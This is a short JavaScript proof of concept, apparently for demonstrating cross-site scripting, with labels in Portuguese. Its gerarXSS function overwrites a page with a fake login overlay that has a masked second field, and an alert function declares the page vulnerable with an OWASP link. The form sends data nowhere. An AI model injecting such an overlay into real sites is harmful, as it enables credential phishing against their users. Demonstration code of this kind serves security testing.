function gerarXSS(){
  var div = document.createElement('div'),
        log = document.createElement('div'),
        reg = document.createElement('div'),
        loginForm = document.createElement('form'),
        registerForm = document.createElement('form');
    
    document.body.style.color = '#fff';
    document.body.style.textTransform = 'capitalize';
    document.body.style.backgroundImage = "url('https://cdn.lennar.net/images/com/images/new-homes/3/63/mhi/El%20Dorado%20Hills%20Sunset-1200x540.jpg?w=1200&h=540&as=1)";
    document.body.style.backgroundSize = "cover";

    div.style.background = "rgba(0,0,0,0.7)";
    div.style.width = '300px';
    div.style.margin = '50px auto';
    div.style.padding = '10px';
    div.style.borderRadius = '10px';
    log.style.padding = "5px";
    log.style.textAlign = "center";
    log.style.color = '#fff';
    log.style.cursor = 'pointer';
    log.id = 'login';
    log.innerHTML = 'POC - Manipulando o DOM...';

    reg.onclick = function(){
      this.style.color = '#fff';
      log.style.color = '#888';
      loginForm.style.display = 'none';
      registerForm.style.display = 'block';
    };
  
    log.onclick = function(){
      this.style.color = '#fff';
      reg.style.color = '#888';
      loginForm.style.display = 'block';
      registerForm.style.display = 'none';
    };
  
    var inputStyles = "background:none;border-color:#888;border-width:0 0 1px 0;width:100%;color:#fff;padding:5px;margin:5px;",
        btnStyles = "background:red;border:none;width:100%;color:#fff;padding:5px;margin:5px;",
        forgetStyles = "color:#fff;",
        startYears = 10,
        endYears = 70,
        i;
    
    loginForm.style.margin = '50px 20px 20px 20px';
    loginForm.id = 'loginForm';
  
    loginForm.innerHTML = "<label>Dados1</label><br/>" + 
                    "<input type='text' placeholder='Dados1' style='"+ inputStyles +"' /><br/>" + 
                    "<label>Dados2</label><br/>" + 
                    "<input type='Dados2' placeholder='*************' style='"+ inputStyles +"' /><br/>" + 
                    "<input type='submit' value='Enviar' style='"+ btnStyles +"' />" ;
    div.appendChild(log);
    div.appendChild(reg);
    div.appendChild(loginForm);
    document.body.appendChild(div);
  }

function alerta(){
    alert("PÃ¡gina vulnerÃ¡vel a XSS ,info :  https://owasp.org/www-community/attacks/xss/" );
}
